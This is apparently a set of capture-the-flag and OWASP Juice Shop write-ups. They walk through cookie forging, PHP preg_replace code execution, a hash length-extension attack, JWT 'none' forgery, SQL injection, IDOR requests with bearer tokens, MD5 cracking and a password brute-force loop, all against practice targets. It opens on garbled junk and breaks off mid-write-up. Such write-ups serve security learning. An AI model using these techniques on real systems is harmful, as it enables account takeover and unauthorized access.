~0|4
_xWR
~ |8
/<Ay
\x/F
|{wk
>+xs
/<Ay
okuq
quko
]iSC
x~-#
ouuo
okuq
m-<+c
Z\k7Z^
*xWM
~ |G
nR+I
]_`~
k?g_
muXf
x~-#
ouuo
mV{i
uMsY
-mn4;
8?m_
|Uiw
ouuo
}F;i
~4|@
okuq
~+|T
iV3\
~0|K
_xWR
okuq
_iZu
x~-#
ouuo
*huY
~5|G
okuq
mV{i
]*huX-
ouuo
ouuo
+H~@
[Awi}
Ww~*
/-5M
-tk{
*huY
>4|m
u]+N
k?g_
~5|G
>+xs
okuq
x~-#
qkkq
```

Hmm, nada.

```
$ file search.txt
search.txt: JPEG image data, JFIF standard 1.01
```

Tricky, tricky...

```
$ mirage search.txt
# QR code -> https://dhavalkapil.com/assets/files/flag.txt
```



### File: writeups/Backdoor/UNDISPUTED/README.md

https://backdoor.sdslabs.co/challenges/UNDISPUTED

Ok, first let's download the file and see what we've got.

```
$ wget http://hack.bckdr.in/UNDISPUTED/file.ext4
$ file file.ext4
file.ext4: Linux rev 1.0 ext4 filesystem data, UUID=088c23fa-b15c-4439-b709-990571544124 (extents) (huge files)
```

Looks like an [ext4 filesystem](https://en.wikipedia.org/wiki/Ext4). Let's mount it.

```
$ mkdir file && sudo mount file.ext4 file
$ ls file
lost+found  n00b.7z
```

So we have a zipfile, let's check it out.

```
$ 7zr x n00b.7z
7-Zip (A) [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)
Processing archive: n00b.7z
Extracting  n00b/n00b.txt
Extracting  n00b
Everything is Ok
Folders: 1
Files: 1
Size:       28
Compressed: 194
$ ls n00b
n00b.txt
$ cat n00b/n00b.txt
flag: like_a_walk_in_a_park
$ echo -n like_a_walk_in_a_park | sha256sum
bc2e81c4c8abd0fe06d54bf0768036ecaea12892efdd6cd567235c84a16c8c07
```

Bingo.



### File: writeups/Backdoor/WEIRD-AUTH/README.md

Backdoor: WEIRD-AUTH
--------------------------------

https://backdoor.sdslabs.co/challenges/WEIRD-AUTH

The challenge asks us to try to gain access to the admin account. The obvious
first thing to do is to inspect the source of the webpage. Besides the login 
inputs, there doesn't seem to be much to play around with except for a 
suspicious icon in the HTML head. However, upon downloading the icon and running 
it briefly through some online gif forensics tools, there doesn't seem to be
anything special with the gif. Considering the fact that the problem is 150
points, it's also unlikely the challenge will be that easy.

The next logical step seemed to be exploiting some sort of vulnerability in the
input validation, e.g with SQL injection or by submitting PHP code to see if the 
input values are ever evaluated. However, after a few rounds of trial and error
it appeared that this would not work as well. As long as the username isn't
`admin` (which, presumably, we are trying to get access to) nor `vampire`, the
username is essentially echoed back to us in the logged in page. Likewise, the
password didn't seem to produce any obvious side effects.

In the process of logging in with various dummy usernames, however, one notable 
thing was that the cookie was being set to a common string postfixed with a 
unique sequence of characters (one could obtain the cookie by inspecting the
HTTP headers, or, alternatively, printing the value of `document.cookie` in the
web console). For instance, when logging in with username "asdf", the cookie 
would be set to "session=6f61736469303833686a64616e6d6164666f77753061736466",
whereas when logging in with username "hello", the cookie would be set to 
"session=6f61736469303833686a64616e6d6164666f77753068656c6c6f". As it turns out, 
both cookies share the prefix "6f61736469303833686a64616e6d6164666f777530", 
with the unique postfixed sequence being the hex encoding of the username (more  
concretely, the "61736466" of the first cookie is the hex equivalent of "asdf").
With this, we can easily gain access to the admin account, by simply setting the
cookie to be "6f61736469303833686a64616e6d6164666f77753061646d696e".

Once in the admin account, everything is ostensibly the same. However, after 
poking around in the HTML a bit logner, the suspicious icon tag in the head 
noticeably refers to a different image, "icon256.gif", as opposed to "icon.gif" 
from before. A common technique with concealing data within images is appending 
the bytes of a different file to the end of the image. An image with extra bytes 
appended will behave largely the same as the original as long as the image 
header and footer are left intact. Indeed, a quick inspection of the sizes of 
"icon256.gif" and "icon.gif" reveals that "icon256.gif" is indeed larger.
Further, if we diff the hex dumps of the two images, we see that "icon256.gif" 
is actually the exact same as "icon.gif" with extra bytes appended to it. If we 
extract those extra bytes into its own file, and run the `file` command on it, 
we see that the bytes actually constitute a `zip` archive. 

Running the file through an unarchiver, we are left with a folder containing a 
`class` file. The `class` file itself isn't too helpful, although it's easily to
decompile (there are online tools to do this). The decompilation results in the
following code:

```
import java.io.PrintStream;
import java.security.MessageDigest;

public static void main(String[] arrstring) throws Exception {
    String string = "U0hBMjU2ezYxZl8xNV9uMWMzXzcwX2gxZDNfbXlfajR2NF9wcjA2cjRtfQ==";
    byte[] arrby = string.getBytes("UTF-8");
    MessageDigest messageDigest = MessageDigest.getInstance("MD5");
    byte[] arrby2 = messageDigest.digest(arrby);
    String string2 = new String(arrby2);
    System.out.println("Flag is " + string2);
}
```

Running the program as is, however, we find that the value of `string2` as well 
as the `sha256` of `string2` don't yield the correct flag. The last piece of the 
puzzle is realizing that the `md5` computation is misdirection -- the variable 
`string` is actually just the `base64` encoding of the flag (as hinted by the
trademark `==` of `base64` strings). Indeed, if we `base64` decode the string, 
we are left with the flag.



### File: writeups/Backdoor/WEIRD-AUTH2/README.md

Backdoor: WEIRD-AUTH2
--------------------------------

https://backdoor.sdslabs.co/challenges/WEIRD-AUTH2

Initial observations
--------------------------------
Scanning through the source, a few things stand out immediately:
- the default value of `$key` is set to a string which appears in the
  `$actualPassage` 27 times, which is pretty fishy
- our inputs are passed directly to `preg_replace`, which is a red flag

The first observation seems a bit tricky to exploit. Given the information, what kind of inputs can we provide to get `$lockedPassage` (about which we have little knowledge) to equal `$actualPassage`? The answer isn't really clear. Let's see if we can do something with `preg_replace` first.

Exploiting `preg_replace`
--------------------------------
After a brief search about `preg_replace exploits` on google, we find that `preg_replace` actually supports the `e` modifier for executing arbitrary code in the replacement string. The caveat is that the `e` modifier was removed for versions of php over `7.0.0`. Luckliy for us, if we submit the form and inspect the response headers (you can do that via the `network` tab in the chrome inspector) we verify that the `php` version is indeed `< 7.0.0`: `X-Powered-By:PHP/5.5.9-1ubuntu4.17`.

The other caveat is that the `$key` (which we plan to execute using the `e` modifier) can only be 5 characters long. This rules out a good amount of functions available to us; even `print` requires more than 5 characters. With a bit of observation, however, we see that the source contains a suspicious-looking `p` function that pretty much does nothing besides act as an alias for `print_r`. This means we can still print anything less than three characters long. How can we use this to our advantage?

Using the indirect path
--------------------------------
After a bit of thought, it seems like we could use regex to match the entire `$lockedPassage` string (e.g with `/(^.*$)/e`) and then use backreferences to print the variable out (e.g with `p($1)`). With that, we could then try to reverse engineer the desired inputs to get `$unlockedPassage === $lockedPassage`, potentially using our first observation about the default value of `$key` being in `$actualPassage` 27 times. This would seem to be the most direct way of getting the flag, by forcing ourselves into the success condition of `if ($unlockedPassage === $lockedPassage)`.

This all seemed pretty complicated. What if we didn't actually need to get into the success condition of the `if` statment? We could just print out the value of `$f` directly! Even though we still get the failure message, as a side-effect we'll have obtained our flag, and that's good enough.

Last hurdle
--------------------------------
Still, it looks like entering `/(^.*$)/e` for the password and `p($f)` for the key isn't working. In fact, it looks like our password input is being filled with random characters on submit (if you pay attention to the input field, you'll notice it), with the likely culprit being the `mySubmit()` handler of the form.

Beating the game
--------------------------------
Indeed, after poking around the `html` we see some nasty minified javascript code which screws with the password input before submitting the form. We could try to reverse engineer the function, but better yet, let's just override the `mySubmit()` handler to do what we want. The most straightforward way is to turn it into a no-op:

```
var script = document.createElement('script');
script.textContent = "mySubmit = function () { return true; }";
document.head.appendChild(script);
```

Note that we have to inject the function via a `script` tag because inline javascript is executed in a separate [context](https://developer.chrome.com/extensions/content_scripts#execution-environment) than the javascript run via the chrome console (hence writing `window.mySubmit = function () { return true; }` will not work).

Indeed, if we submit again with the above inputs, we get the flag.



### File: writeups/Ghost in the Shellcode/Knockers/README.md

http://ghostintheshellcode.com/2015-final/

Alright, what do we have here...

```
$ wget -O knockers.dat http://ghostintheshellcode.com/2015-final/knockers-28e0925c5d1a7e50f21a32e5448cf84a4216e46dbedbb2266fd8a6cc6ee889f5
$ file knockers.dat
knockers.dat: XZ compressed data
$ tar xf knockers.dat
$ file knockers.py
knockers.py: Python script, ASCII text executable
```

Now we're getting somewhere.

So let's open it up and see what we've got. Hmm, this looks useful...

```
try:
    from fw import allow
except ImportError:
    def allow(ip,port):
        print 'allowing host ' + ip + ' on port ' + str(port)
```

Ok, so perhaps we're trying to open up some firewall rule? The challenge
said `Dude, here's a knocker token that will let you access my service on port
80. One day I will let you see my cool stuff on port 7175` so that sounds
about right.

```
l = parse_and_verify(g_h, g_key, data)
if l is None:
	print 'bad message'
else:
	for p in l:
		allow(self.client_address[0], p)
```

Searching through the source it looks like here is the only place that the
`allow()` function gets called, so we've got to hit this location in the code.
Looks like we've got to make sure the `l` variable is iterable with data. So
lets check out the `parse_and_verify()` function.

```
ds = h().digest_size
if len(m) < ds:
    return None
mac = m[:ds]
msg = m[ds:]
if h(k+msg).digest() != mac:
    return None
port_list = []
for i in range(0,len(msg),2):
    if i+1 >= len(msg):
        break
    port_list.append(struct.unpack_from('!H', msg, i)[0])
return port_list
```

Ok, so this is where the bulk of our attention will need to be focused. So `m`
is the message and its length can't be `< ds`, which ends up being `64`:

```
In [103]: import hashlib
In [104]: hashlib.sha512().digest_size
Out[104]: 64L
```

...after we notice that `g_h = hashlib.sha512` at the top of the file.
So `m` can't be `< 64`, the first `64` bytes of `m` are the `mac` and the
remainder is the `msg`. If we want to append data to the port list we also
have to pass the message authentication check against the `mac`. So
`h(k+msg).digest()` must `= mac` where `k` is our secret key we've generated
previously. We want to have some longer list of ports that the remote computer
allows than was created when the secret key was initialized. So `msg` needs to
contain some list of integers to be unpacked. But how do we list more ports
than the message authentication code allows? The key line ends up being:

```
if h(k+msg).digest() != mac:
```

Which is a canonical example of a [length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack)
against [Merkle-Damgard](https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction) based algorithms.

Googling around for Python based attacks against this weakness leads to plenty
of libraries you can use. I used [this](https://pypi.python.org/pypi/hashpumpy/1.0) one. After getting a single successful
attack off I decided to write a quick attack script. I've included it in the
writeup.as `knock.py`.

And the result...

Client:

```
$ python2.7 knock.py -k 16 -t 'a5b53094ac9ce6b21d3dbe1cd8d5929731fb0bf58a81a8dca0a8338dbdb2b954d006988a850af665be1e7c87f33dceb296020219d0a43c6f830ee8d6e982e8f61f48' -p 7075
```

Server:

```
$ python2.7 knockers.py serve
Client: ::1 len 178
allowing host ::1 on port 8008
allowing host ::1 on port 32768
allowing host ::1 on port 0
allowing host ::1 on port 0
...
allowing host ::1 on port 0
allowing host ::1 on port 0
allowing host ::1 on port 144
allowing host ::1 on port 7075
```

Boom! We've opened up port `8008` and `7075`! You may also be curious why
other ports were opened as well. When performing the length extension attack
the data has to be extended by a full block, so we end up with a full,
additional block of useless data with the useful data at the end (the
additional port we want to open in this case).



### File: writeups/Juice Shop/Admin Section/README.md

Finding the Admin Section was a bit more difficult than the Score Board. After
searching around the HTML for "admin", or similar terms, I found nothing.

I tried a few obvious URLs like `/#/admin`, `/#/admin-section`, etc. and still
no luck.

I decided to try poking around in the JS code, which looks like it has a lot of
goodies. Searching for "admin" in this file turned up some much more
interesting results. It eventually led me to the `/#/administration` URL, and
viola!



### File: writeups/Juice Shop/Basket Access/README.md

Again, the hint is really helpful here:

```
Have an eye on the HTTP traffic while shopping. Alternatively try to find client-side association of users to their basket. Click for more hints.
```

If we poke around in the Network tab of the inspector while visiting our basket
we see the following XHR connections made:

```
http://localhost:3000/rest/user/whoami
http://localhost:3000/rest/basket/1
http://localhost:3000/rest/admin/application-configuration
```

The `http://localhost:3000/rest/basket/1` URL looks most interesting for this
challenge. Let's try and grab another user's bucket:

```
$ curl -s 'http://localhost:3000/rest/basket/2'
<html>
...
  </head>
  <body>
    <div id="wrapper">
      <h1>Juice Shop (Express ~4.16)</h1>
      <h2><em>401</em> UnauthorizedError: No Authorization header was found</h2>
      <ul id="stacktrace"></ul>
    </div>
  </body>
</html>
```

If we look carefully at the connections in the Network tab in the inspector
we can see they include an `Authorization` header. We can grab the header from
the inspector and try again:

```
$ curl -s 'http://localhost:3000/rest/basket/2' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAifSwiaWF0IjoxNTE1MDEyMjc4LCJleHAiOjE1MTUwMzAyNzh9.GyvuBD6CTsQqE8sr7TX2a7WB4dOUTPnW58GoxuODaJzEEMAr8mtiIsFjY1Vwo9JRhWP4krbn1djXDfs7NP0D8qi2ybfcuwSBiFp2NROce9TpIcSG9jUj8OPlLsoR7dJBkPfhjN4LF111Qtl0HX1YlSYRdITSMj9ybvbRmQ_YgKo'
{"status":"success","data":{"id":2,"coupon":null,"createdAt":"2018-01-03T20:18:03.861Z","updatedAt":"2018-01-03T20:18:03.861Z","UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"image":"raspberry_juice.jpg","createdAt":"2018-01-03T20:18:03.856Z","updatedAt":"2018-01-03T20:18:03.856Z","deletedAt":null,"BasketItem":{"id":4,"quantity":2,"createdAt":"2018-01-03T20:18:03.861Z","updatedAt":"2018-01-03T20:18:03.861Z","BasketId":2,"ProductId":4}}]}}
```

Let's make that a bit more readable:

```
$ curl -s 'http://localhost:3000/rest/basket/2' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAifSwiaWF0IjoxNTE1MDEyMjc4LCJleHAiOjE1MTUwMzAyNzh9.GyvuBD6CTsQqE8sr7TX2a7WB4dOUTPnW58GoxuODaJzEEMAr8mtiIsFjY1Vwo9JRhWP4krbn1djXDfs7NP0D8qi2ybfcuwSBiFp2NROce9TpIcSG9jUj8OPlLsoR7dJBkPfhjN4LF111Qtl0HX1YlSYRdITSMj9ybvbRmQ_YgKo' | python -mjson.tool
{
    "data": {
        "Products": [
            {
                "BasketItem": {
                    "BasketId": 2,
                    "ProductId": 4,
                    "createdAt": "2018-01-03T20:18:03.861Z",
                    "id": 4,
                    "quantity": 2,
                    "updatedAt": "2018-01-03T20:18:03.861Z"
                },
                "createdAt": "2018-01-03T20:18:03.856Z",
                "deletedAt": null,
                "description": "Made from blended Raspberry Pi, water and sugar.",
                "id": 4,
                "image": "raspberry_juice.jpg",
                "name": "Raspberry Juice (1000ml)",
                "price": 4.99,
                "updatedAt": "2018-01-03T20:18:03.856Z"
            }
        ],
        "UserId": 2,
        "coupon": null,
        "createdAt": "2018-01-03T20:18:03.861Z",
        "id": 2,
        "updatedAt": "2018-01-03T20:18:03.861Z"
    },
    "status": "success"
}
```

And the challenge is complete!



### File: writeups/Juice Shop/Confidential Document/README.md

The hint put me on the lookout for places in the application that deliver files:

```
Analyze and tamper with links in the application that deliver a file directly. Click for more hints.
```

After clicking around in the application for a while I stumbled upon the
"Checkout" functionality. After added items to the checkout basket you can
visit "Your Basket." Once here, clicking on the "Checkout" button takes you
to an invoice page:

```
http://localhost:3000/ftp/order_78263d11ddddd79fd2557de9e9c1d475.pdf
```

Hmm, looks like an FTP server. I wonder what happens if we visit `http://localhost:3000/ftp`...

Visiting this directory yields:

```
acquisitions.md9092017-12-18
coupons_2013.md.bak1312017-12-18
eastere.gg3242017-12-18
incident-support.kdbx32782017-12-18
legal.md30472017-12-18
order_35217501cf4ba4a24260f08bb2feb28d.pdf12202018-1-3
order_78263d11ddddd79fd2557de9e9c1d475.pdf11522018-1-3
order_85d50d46c43c52d8294ec94d0d910597.pdf11532018-1-3
package.json.bak43662017-12-18
suspicious_errors.yml
```

Investigating some of these sensitive markdown files does the trick and
completes the challenge!



### File: writeups/Juice Shop/Five-Star Feedback/README.md

This challenge is trivial given the hint:

```
Once you found admin section of the application, this challenge is almost trivial. Click for more hints.
```

After having found the adminstration page in `Admin Section` all we have to do
is click the trash button on all the 5-star reviews. Ezpz.



### File: writeups/Juice Shop/Forged Feedback/README.md

The most difficult part of this challenge was determining what they mean by
"feedback." Is is feedback on a particular shop item, feedback via a complaint,
or feedback via a "Contact Us" submission?

After trying all 3, turns out it was via a "Contact Us" submission. The API
endpoint for submitting the "Contact Us" form allows the client to specify the
User ID of the submitter.

If we pull the submission post from the Chrome inspector via the "Copy as
cURL" feature we can easily grab a `curl` command for submitting the form. E.g.

```
$ curl 'http://localhost:3000/api/Feedbacks/' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wMi0wNSAxMToxNjoxMy4zODggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wMi0wNSAxMToxNjoxMy4zODggKzAwOjAwIn0sImlhdCI6MTUxNzgzNTQwNywiZXhwIjoxNTE3ODUzNDA3fQ.S2hqT5yEvtJKgohm4FrExMGRIIx3-H85wHK383n_dPNdQcHhjivwRsC8B44eJmmfyg0AWz87AihQ9YV4t6xJXHblGr05P4Rb0vFYaHZTxAqkFglUehrqONId_lTDOx_Z4DGvrjSWJkxE0wutGjICrNIPwteHkr4G79iwOOh7Xdk' --data-binary '{"UserId":3,"comment":"WAT","rating":1}'
{"status":"success","data":{"id":12,"updatedAt":"2018-02-05T15:14:33.591Z","createdAt":"2018-02-05T15:14:33.591Z","comment":null,"rating":null,"UserId":null}}
```

So, despite using the authorization token for `jim` (User ID `2`), we can
submit customer feedback for `bender` (User ID `3`).

And the lesson for the day is... Don't let the client determine which user it's
submitting data for.



### File: writeups/Juice Shop/JWT Issues Tier 1/README.md

This is my first foray into JWT land, so I've got some reading up to do.

Starting with the [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token) Wikipedia page seems like a good enough place.

First off, where is this thing stored? Checking the Cookies storage in the
Chrome Inspector turns up the `token` cookie. We can do some basic checks to
confirm that this is the cookie:

```
In [10]: s = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIn0sImlhdCI6MTUyMjMzMzk3NywiZXhwIjoxNTIyMzUxOTc3fQ.sJdk9Xdx3E6AGx3lp640dQTbGhWX0FluQBLAB3goFyEwpCBi4PH_11qi2EMad7-kBFiYDNzE66WbUhY7IEYEIdUN1x-avdoaijZuWpPkeEgmhOwWhXkTwm7O1T3wwH5CSZ5i_1yAxAGqX0HHUx1QtrRRD-sUii0_rdISe3JSdBE'

In [11]: len(s.split('.'))
Out[11]: 3
```

From the Wiki page:

> JWTs generally have three parts: a header, a payload, and a signature.

Okay, seems we're on the right track.

```
In [14]: parts = s.split('.')

In [15]: base64.b64decode(parts[0])
Out[15]: b'{"alg":"RS256","typ":"JWT"}'
In [21]: base64.b64decode(parts[1])
---------------------------------------------------------------------------
Error                                     Traceback (most recent call last)
<ipython-input-21-5e0c367146c7> in <module>()
----> 1 base64.b64decode(parts[1])

/usr/lib/python3.5/base64.py in b64decode(s, altchars, validate)
     86     if validate and not re.match(b'^[A-Za-z0-9+/]*={0,2}$', s):
     87         raise binascii.Error('Non-base64 digit found')
---> 88     return binascii.a2b_base64(s)
     89 
     90 

Error: Incorrect padding
```

Hmm, the second part of the token *should* be Base64 decodable, but it seems
something's off with the padding. If my memory of how Base64 encoding works is
correct, I believe we can pad it with '='.

```
In [22]: base64.b64decode(parts[1]+'=')
---------------------------------------------------------------------------
Error                                     Traceback (most recent call last)
<ipython-input-22-a29920dd679d> in <module>()
----> 1 base64.b64decode(parts[1]+'=')

/usr/lib/python3.5/base64.py in b64decode(s, altchars, validate)
     86     if validate and not re.match(b'^[A-Za-z0-9+/]*={0,2}$', s):
     87         raise binascii.Error('Non-base64 digit found')
---> 88     return binascii.a2b_base64(s)
     89 
     90 

Error: Incorrect padding

In [23]: base64.b64decode(parts[1]+'==')
Out[23]: b'{"status":"success","data":{"id":2,"email":"jim@juice-sh.op","password":"e541ca7ecf72b8d1286474fc613e5e45","createdAt":"2018-03-29 14:28:53.687 +00:00","updatedAt":"2018-03-29 14:28:53.687 +00:00"},"iat":1522333977,"exp":1522351977}'
```

Nice, that worked. Okay, we're trying to forge a token for
`jwtn3d@juice-sh.op`, can we just change the email and re-encode?

Looks like simply changing the email address and re-encoding doesn't do the
trick. Let's investigate some attacks against JWT.

After Googling around a bit [this](https://www.owasp.org/index.php/JSON_Web_Token_(JWT)_Cheat_Sheet_for_Java)
OWASP JWT cheatsheet is very useful. Using the NONE hashing algorithm, changing
the email address, and re-encoding does the trick! To recap:

```
In [79]: header = base64.b64decode(parts[0]).decode('utf-8')
In [80]: payload = base64.b64decode(parts[1]+'==').decode('utf-8')
In [81]: updated_header = header.replace('RS256', 'none')
In [82]: updated_payload = payload.replace('jim@juice-sh.op', 'jwtn3d@juice-sh.op')
In [83]: b64_updated_header = base64.b64encode(str.encode(updated_header)).decode('utf-8')
In [84]: b64_updated_payload = base64.b64encode(str.encode(updated_payload)).decode('utf-8')
In [85]: token = '.'.join([b64_updated_header.strip('='), b64_updated_payload.strip('='), parts[2]])
In [86]: token
Out[86]: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIn0sImlhdCI6MTUyMjMzMzk3NywiZXhwIjoxNTIyMzUxOTc3fQ.sJdk9Xdx3E6AGx3lp640dQTbGhWX0FluQBLAB3goFyEwpCBi4PH_11qi2EMad7-kBFiYDNzE66WbUhY7IEYEIdUN1x-avdoaijZuWpPkeEgmhOwWhXkTwm7O1T3wwH5CSZ5i_1yAxAGqX0HHUx1QtrRRD-sUii0_rdISe3JSdBE'
```

Copying that token string into the token Cookie in the Chrome Inspector solves
the challenge!

I'm not entirely sure why JWT doesn't include the '=' padding at the end of
its Base64 encoded parts, but that's how the token was initially presented.



### File: writeups/Juice Shop/Login Admin/README.md

The description of the next challenge essentially gave away this one:

> Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

Placing a single `'` in the Email and anything in the Password results in the
following:

```
{"error":{"message":"SQLITE_ERROR: unrecognized token: \"098f6bcd4621d373cade4e832627b4f6\"","stack":"SequelizeDatabaseError: SQLITE_ERROR: unrecognized token: \"098f6bcd4621d373cade4e832627b4f6\"\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)","name":"SequelizeDatabaseError","parent":{"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'"},"original":{"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'"},"sql":"SELECT * FROM Users WHERE email = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'"}}
```

So we can be fairly sure it's an SQL injection. Trying `' OR 1=1 --` does the trick :)



### File: writeups/Juice Shop/Login Jim/README.md

After obtaining admin's password by simply Googling the hash, I wanted to
do something a little more interesting this time around.

First, we need to grab Jim's password hash:

```
$ curl -s 'http://localhost:3000/api/Users/2' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTA0IDE0OjI0OjQxLjAyNSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTA0IDE0OjI0OjQxLjAyNSArMDA6MDAifSwiaWF0IjoxNTE1MDgzOTQxLCJleHAiOjE1MTUxMDE5NDF9.GNlwhCE34Hqbj4Tqs1hAdcp7SPwEZuoAtHsnbbOHcvpmJF9-CsV9sPXU5Fg2RBV3chyuQbcTPev1uzVdHGdt_vunzJhtl2PhYqLBB3e3dF8ah5sFbAsiRtFuHjOYOf5QsiiXl4lzx36QCaduWNFnfR15YRvtWq6srQT7gYJlNjE' | python -mjson.tool
{
    "data": {
        "createdAt": "2018-01-04T18:58:03.757Z",
        "email": "jim@juice-sh.op",
        "id": 2,
        "password": "e541ca7ecf72b8d1286474fc613e5e45",
        "updatedAt": "2018-01-04T18:58:03.757Z"
    },
    "status": "success"
}
```

Alright, let's put `e541ca7ecf72b8d1286474fc613e5e45` in `jim-hash.txt`.

Let's try and simply brute force this password...

[John the Ripper](http://www.openwall.com/john/) is a great, simple password
cracker.

Remember, the admin password was stored as a simple MD5 hash. We can use
this information to start cracking with `john`:

```
$ ./run/john --format=raw-MD5 jim-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:24  3/3 0g/s 46396Kp/s 46396Kc/s 46396KC/s plkbb074..plk3sa90
...
ncc-1701         (?)
1g 0:01:09:42 DONE 3/3 (2018-01-04 13:04) 0.000239g/s 47605Kp/s 47605Kc/s 47605KC/s ncc-15pa..ncc-175h
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`ncc-1701` it is! Coming in at a little over an hour, it's probably best to
stick with other methods unless you know a password is trivially simple.



### File: writeups/Juice Shop/Password Strength/README.md

The hint for this challenge gives us a few options to go after:

```
This one should be equally easy to a) brute force, b) crack the password hash or c) simply guess. Click for more hints.
```

First, I attempted the brute force approach. I downloaded a password list and got to work...

Note that finding the `login` API endpoint was useful ;)

```
http://localhost:3000/rest/user/login
```

Let's grab a password list:

```
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt
```

And start crackin'...

```
$ for password in $(cat 10_million_password_list_top_10000.txt); do echo $password && curl -s -X POST 'email=admin@juice-sh.op&password=$password' 'http://localhost:3000/rest/user/login' && echo; done
123456
Invalid email or password.
password
Invalid email or password.
12345678
Invalid email or password.
qwerty
Invalid email or password.
123456789
Invalid email or password.
...
```

Unfortunately, this didn't turn up much. We could either keep trying password
lists, or look at the password hash. But first, how to we access the password
hash...

I eventually found a way to access the administration API, which offers up a
user's password hash. We can inspect users by visiting the following URL:

```
http://localhost:3000/#/administration
```

Next, we can see it queries for user information by hitting the following
administration API endpoint:

```
http://localhost:3000/api/Users/<user-id>
```

When we hit this API with the admin's user ID we're able to get the hash:

```
